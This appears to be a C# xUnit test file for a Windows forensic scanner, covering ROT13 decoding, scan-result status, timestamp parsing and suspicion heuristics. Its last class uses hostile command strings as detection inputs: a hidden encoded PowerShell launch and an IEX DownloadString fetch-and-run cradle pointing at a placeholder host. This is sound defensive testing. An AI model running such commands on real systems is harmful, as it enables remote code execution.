using System;
using System.Runtime.Versioning;
using GhostTrace.Core.Enums;
using GhostTrace.Modules.Common;
using Xunit;

namespace GhostTrace.Tests.Unit.Modules.Common;

public class Rot13Tests
{
    [Theory]
    [InlineData("Hello", "Uryyb")]
    [InlineData("Uryyb", "Hello")]                 // self-inverse
    [InlineData("Microsoft.Windows", "Zvpebfbsg.Jvaqbjf")]
    [InlineData("123-abc-XYZ", "123-nop-KLM")]     // digits/symbols untouched
    public void Transform_RoundTrips(string input, string expected)
    {
        Assert.Equal(expected, Rot13.Transform(input));
    }

    [Fact]
    public void Transform_AppliedTwice_ReturnsOriginal()
    {
        const string original = @"{6D809377-...}\Notepad++\notepad++.exe";
        Assert.Equal(original, Rot13.Transform(Rot13.Transform(original)));
    }
}

[SupportedOSPlatform("windows")]
public class ScanResultBuilderTests
{
    [Fact]
    public void FindingsNoErrors_IsSuccess()
    {
        var r = new ScanResultBuilder("M").AddFinding("c", "d", "s").Build();
        Assert.Equal(ScanStatus.Success, r.Status);
    }

    [Fact]
    public void FindingsWithErrors_IsPartial()
    {
        var r = new ScanResultBuilder("M").AddFinding("c", "d", "s").AddError("boom").Build();
        Assert.Equal(ScanStatus.PartialSuccess, r.Status);
    }

    [Fact]
    public void NoFindingsWithErrors_IsFailure()
    {
        var r = new ScanResultBuilder("M").AddError("boom").Build();
        Assert.Equal(ScanStatus.Failure, r.Status);
    }

    [Fact]
    public void NoFindingsNoErrors_IsSuccess_CleanSystem()
    {
        var r = new ScanResultBuilder("M").Build();
        Assert.Equal(ScanStatus.Success, r.Status);
    }

    [Fact]
    public void ForceStatus_Overrides()
    {
        var r = new ScanResultBuilder("M").AddFinding("c", "d", "s").ForceStatus(ScanStatus.Failure).Build();
        Assert.Equal(ScanStatus.Failure, r.Status);
    }

    [Fact]
    public void Metadata_AndCounts_AreCarried()
    {
        var r = new ScanResultBuilder("M")
            .AddFinding("c", "d", "s")
            .SetMetadata("Key", 7)
            .Build();
        Assert.Equal("M", r.ModuleName);
        Assert.Equal("7", r.Metadata["Key"]);
        Assert.Single(r.Findings);
    }
}

public class ForensicTimeTests
{
    [Fact]
    public void FromFileTimeUtc_Zero_IsNull()
    {
        Assert.Null(ForensicTime.FromFileTimeUtc(0));
    }

    [Fact]
    public void FromFileTimeUtc_RoundTrips()
    {
        var expected = new DateTimeOffset(2025, 6, 1, 8, 30, 0, TimeSpan.Zero);
        var got = ForensicTime.FromFileTimeUtc(expected.ToFileTime());
        Assert.Equal(expected, got);
    }

    [Fact]
    public void FromSystemTimeBytes_ParsesValidStructure()
    {
        // 2024-03-15 14:05:06.000 UTC
        var b = new byte[16];
        var s = b.AsSpan();
        System.Buffers.Binary.BinaryPrimitives.WriteUInt16LittleEndian(s.Slice(0, 2), 2024);
        System.Buffers.Binary.BinaryPrimitives.WriteUInt16LittleEndian(s.Slice(2, 2), 3);
        System.Buffers.Binary.BinaryPrimitives.WriteUInt16LittleEndian(s.Slice(4, 2), 5); // dayOfWeek
        System.Buffers.Binary.BinaryPrimitives.WriteUInt16LittleEndian(s.Slice(6, 2), 15);
        System.Buffers.Binary.BinaryPrimitives.WriteUInt16LittleEndian(s.Slice(8, 2), 14);
        System.Buffers.Binary.BinaryPrimitives.WriteUInt16LittleEndian(s.Slice(10, 2), 5);
        System.Buffers.Binary.BinaryPrimitives.WriteUInt16LittleEndian(s.Slice(12, 2), 6);
        System.Buffers.Binary.BinaryPrimitives.WriteUInt16LittleEndian(s.Slice(14, 2), 0);

        var got = ForensicTime.FromSystemTimeBytes(b);
        Assert.Equal(new DateTimeOffset(2024, 3, 15, 14, 5, 6, TimeSpan.Zero), got);
    }

    [Fact]
    public void FromSystemTimeBytes_InvalidMonth_IsNull()
    {
        Span<byte> b = stackalloc byte[16];
        System.Buffers.Binary.BinaryPrimitives.WriteUInt16LittleEndian(b.Slice(0, 2), 2024);
        System.Buffers.Binary.BinaryPrimitives.WriteUInt16LittleEndian(b.Slice(2, 2), 13); // bad month
        Assert.Null(ForensicTime.FromSystemTimeBytes(b));
    }

    [Fact]
    public void FromSystemTimeBytes_TooShort_IsNull()
    {
        Assert.Null(ForensicTime.FromSystemTimeBytes(new byte[8]));
    }

    [Fact]
    public void FromCompactDate_ParsesYyyymmdd_AsUtc()
    {
        // Regression: AssumeUniversal previously produced a local-kind DateTime whose
        // offset didn't match TimeSpan.Zero, throwing ArgumentException at runtime.
        var got = ForensicTime.FromCompactDate("20240115");
        Assert.Equal(new DateTimeOffset(2024, 1, 15, 0, 0, 0, TimeSpan.Zero), got);
        Assert.Equal(TimeSpan.Zero, got!.Value.Offset);
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("not-a-date")]
    [InlineData("2024-01-15")]
    public void FromCompactDate_Invalid_IsNull(string? input)
    {
        Assert.Null(ForensicTime.FromCompactDate(input));
    }
}

public class SuspicionHeuristicsTests
{
    [Theory]
    [InlineData(@"C:\Users\bob\AppData\Local\Temp\x.exe", true)]
    [InlineData(@"C:\ProgramData\evil.exe", true)]
    [InlineData(@"C:\Windows\System32\svchost.exe", false)]
    [InlineData(@"C:\Program Files\App\app.exe", false)]
    public void InspectPath_FlagsUserWritableDirs(string path, bool suspicious)
    {
        Assert.Equal(suspicious, SuspicionHeuristics.IsSuspiciousPath(path));
    }

    [Fact]
    public void InspectPath_DetectsDoubleExtension()
    {
        Assert.True(SuspicionHeuristics.IsSuspiciousPath(@"C:\Users\a\invoice.pdf.exe"));
    }

    [Fact]
    public void InspectPath_DetectsLolBin()
    {
        var reasons = SuspicionHeuristics.InspectPath(@"C:\Windows\System32\rundll32.exe");
        Assert.Contains(reasons, r => r.Contains("rundll32"));
    }

    [Theory]
    [InlineData("powershell -nop -w hidden -enc SQBFAFgA", true)]
    [InlineData("IEX(New-Object Net.WebClient).DownloadString('http://x')", true)]
    [InlineData("Get-ChildItem C:\\temp", false)]
    public void InspectCommand_FlagsMaliciousMarkers(string cmd, bool suspicious)
    {
        Assert.Equal(suspicious, SuspicionHeuristics.IsSuspiciousCommand(cmd));
    }
}
